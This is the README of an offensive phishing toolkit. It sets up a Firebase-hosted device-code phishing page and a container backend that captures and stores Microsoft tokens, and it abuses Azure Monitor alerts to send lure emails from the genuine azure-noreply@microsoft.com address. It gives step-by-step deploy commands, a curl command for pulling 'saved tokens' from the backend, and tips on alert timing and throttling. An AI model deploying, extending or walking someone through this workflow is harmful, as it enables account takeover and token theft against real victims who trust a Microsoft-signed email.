# firephish

repos used: https://github.com/f-bader/TokenTacticsV2 (for handling device code APIs) https://github.com/elastic/detection-rules/issues/5877 (original inspiration for leveraging monitor alerts)      
       
Minimal mostly vibe coded Eviltoken like implentation of Firebase-hosted device-code phishing website using Azure Monitor alerts to send emails from `azure-noreply@microsoft.com`.

Two npm commands:

| | |
|---|---|
| `npm run build:firebase` | renders `public/config.js` from `.env` and deploys `public/` to Firebase Hosting |
| `npm run firephish -- <email>` | provisions a disposable Azure resource group + activity-log alert that fires an email to the target |

---

## Layout

```
FirePhish/
├── public/
│   ├── index.html        # markup only
│   ├── css/styles.css    # all styles
│   └── src/app.js        # device-code stream handler + screen flow
├── scripts/
│   ├── build-config.js   # writes public/config.js from .env
│   └── phish.sh          # azure monitor email-alert trigger
├── container/
│   ├── Dockerfile        # node + powershell runtime image
│   ├── server.js         # SSE wrapper exposing /code with bearer auth
│   ├── get-code.ps1      # device-code request + streamed status output
│   └── package.json      # backend deps
├── firebase.json
├── package.json
└── .env.example
```

---

## Prerequisites (Linux / macOS)

You'll need the following installed:

- **Node.js 18+** — runs the build script and `firebase-tools`.
- **Firebase CLI** — for hosting and emulator.
- **Azure CLI 2.85+** — for the phish trigger. macOS 13+ required for the official build.
- **A Firebase project** — free Spark plan is enough.
- **An active Azure subscription** — the phish script provisions a disposable resource group, so any subscription where you have Contributor on a sub or RG works. Standard Azure Monitor pricing applies (negligible for short runs).
- **A streaming `/code` backend** — landing page expects `text/event-stream` chunks shaped `data: {"line": "..."}` with bearer auth. Included in this repo under `container/` (Docker + Node SSE wrapper around `get-code.ps1`).

### macOS install

```sh
brew install node azure-cli
npm install -g firebase-tools
```

### Linux install (Debian / Ubuntu)

```sh
# node 20 LTS
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# azure cli (Microsoft script)
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# firebase
sudo npm install -g firebase-tools
```

For other distros, see Microsoft's [Azure CLI install docs](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) and Firebase's [hosting quickstart](https://firebase.google.com/docs/hosting/quickstart).

---

## First-time setup

From inside `FirePhish/`:

### 1. Install local deps

```sh
npm install
```

(Pulls `dotenv` for `build-config.js`.)

### 2. Configure environment

```sh
cp .env.example .env
$EDITOR .env
```

Fill in:

| Var | Source |
|---|---|
| `CLOUD_RUN_URL` | full URL of your backend's `/code` endpoint |
| `API_KEY` | bearer token your backend expects |
| `TARGET_URL` | where the "Verify" button sends the victim. Default `https://microsoft.com/devicelogin` is correct for device-code flow. |
| `LANDING_URL` | the Firebase Hosting URL of *this* page once deployed (used in the phish email subject) |

### 3. Authenticate with Firebase

```sh
firebase login
firebase use --add
```

`firebase use --add` lists every Firebase project on your Google account; pick one and give it an alias (`default` is fine). This writes `.firebaserc` in the current dir, scoping all subsequent `firebase` commands to that project. The file is gitignored — every fork starts clean and runs this step themselves.

If you don't have a Firebase project yet, create one at [console.firebase.google.com](https://console.firebase.google.com), then come back.

### 4. Authenticate with Azure

```sh
az login
```

Opens a browser for SSO. If your terminal can't pop a browser (SSH session, etc.), use `az login --use-device-code`.

If you have multiple subscriptions, set the active one:

```sh
az account list -o table
az account set --subscription "<id-or-name>"
```

---

## Local testing (no deploy)

```sh
node scripts/build-config.js
firebase emulators:start --only hosting --project demo-test
```

Serves at `http://localhost:5000`. The `--project demo-test` keeps it emulator-only — no Firebase project needs to be linked, no charges, no risk of hitting prod.

**Caveat:** at `localhost`, `app.js` takes its `IS_LOCAL` path and tries `/api/code`, which the Firebase emulator doesn't proxy to anything by default. CSS, screen transitions, copy button — all those work. The device-code fetch will 404 unless you either:

- Deploy to Firebase first (then test on the live URL), **or**
- Run the `container/` backend locally and flip `const IS_LOCAL = false;` in `public/src/app.js` to point at it.

---

## First deploy

After steps 1–4 above:

```sh
npm run build:firebase
```

That runs:

1. `node scripts/build-config.js` — writes `public/config.js` from your `.env`
2. `firebase deploy --only hosting` — uploads `public/` to your linked Firebase project

The CLI prints your hosting URL (`https://<project-id>.web.app` and `https://<project-id>.firebaseapp.com`). Update `LANDING_URL` in `.env` to that URL if you didn't already.

---

## Deploy the container backend

The landing page calls a streaming `/code` endpoint over CORS with a bearer token. `container/` builds an image that runs `get-code.ps1` (PowerShell + bundled TokenTacticsV2) and exposes it as SSE. Any container host works; Cloud Run is the easiest fit since it's HTTPS by default and scales to zero.

### Env vars the backend reads

| Var | Purpose |
|---|---|
| `PORT` | listen port (Cloud Run injects `8080`) |
| `API_KEY` | bearer token; must match `API_KEY` in the landing page's `.env` |
| `PWSH_CMD` | optional inline pwsh; if unset, runs the bundled `get-code.ps1` |

### Cloud Run (gcloud)

```sh
# from repo root, with a GCP project selected
gcloud builds submit ./container --tag gcr.io/<your-project>/code-service
gcloud run deploy code-service \
  --image gcr.io/<your-project>/code-service \
  --region <region> \
  --platform managed \
  --allow-unauthenticated \
  --port 8080 \
  --set-env-vars API_KEY=<same-token-as-landing-page>
```

`--allow-unauthenticated` is required because the browser calls it directly; access is gated by the bearer token in `API_KEY`. The CLI prints a `https://code-service-<hash>-<region>.a.run.app` URL — paste that into `CLOUD_RUN_URL` in your landing page `.env` and re-run `npm run build:firebase`.
to get saved tokens run 'curl -H `Authorization: Bearer $API_KEY" https://<your-cloud-run-url>/logs`   
### Other hosts

Any platform that runs a container with HTTPS and an env var works (Fly, Render, ECS, a self-hosted box behind a reverse proxy). The image listens on `$PORT` and only needs `API_KEY` set.

---

## Send the phishing email

```sh
npm run firephish -- victim@example.com
```

What the script does:

1. Deletes any prior `MS365` resource group (clean slate)
2. Creates `MS365` in `eastus`
3. Attaches an action group with the target email as recipient
4. Creates an activity-log alert on `Microsoft.Resources/tags/write`
5. Sleeps 90s for the rule to warm up (Azure activity-log alerts have a ramp-up window before they evaluate the event stream)
6. Writes a tag on the RG to fire the alert
7. Sleeps 5 min for Azure to deliver the email
8. Deletes the RG

The email arrives from `azure-noreply@microsoft.com` with subject pulled from `LANDING_URL`.

> **First-time recipient note:** the *first* time any address is added to an action group, Azure sends a one-time confirmation email separately ("You've been added to..."). The phishing email arrives after that, once the warm-up + tag write fires the rule. On subsequent runs to the same address, only the alert email goes out.

---

## Tunables

- `LANDING_URL` (env) — interpolated into the alert subject. Defaults to a placeholder if unset.
- Everything else (`RG_NAME`, `ACTION_GROUP_NAME`, `LOCATION`, sleep durations) is hardcoded in `phish.sh` — edit the script directly if you need to change them.

---

## Troubleshooting

**`firebase emulators:start` fails with "No currently active project"**
Run `firebase use --add` (one-time), or pass `--project demo-test` for emulator-only use.

**Email never arrives, but the script ran cleanly**
Three usual suspects:
- Confirmation email is in spam — check there first if it's a new recipient.
- Activity log alert evaluation is async; if the script's 5-min cooldown wasn't enough (rare), increase the final `sleep 300` in `phish.sh`.
- Azure throttles action-group emails at 100/hr per address — silent drop. If you've been hammering the same address during testing, wait an hour.

**`/api/code` 404 in browser console during local emulator test**
Expected — see "Local testing" caveat above. Deploy or flip `IS_LOCAL` to bypass.

---

## Examples

What the target sees in their inbox — sender is the legitimate `azure-noreply@microsoft.com`, signed and TLS-encrypted by `microsoft.com`:

![Inbox view](img/image.png)

Opened email body — the alert subject (containing your `LANDING_URL`) is rendered as a clickable link inside Microsoft's normal Azure Monitor alert template:

![Opened alert email](img/image%20copy.png)

Once the target clicks through, here's the full Firebase landing-page workflow — landing screen → device code revealed → copy + verify → Microsoft's real device-code prompt where the victim pastes it:

![Firebase site workflow](img/image%20copy%202.png)

 
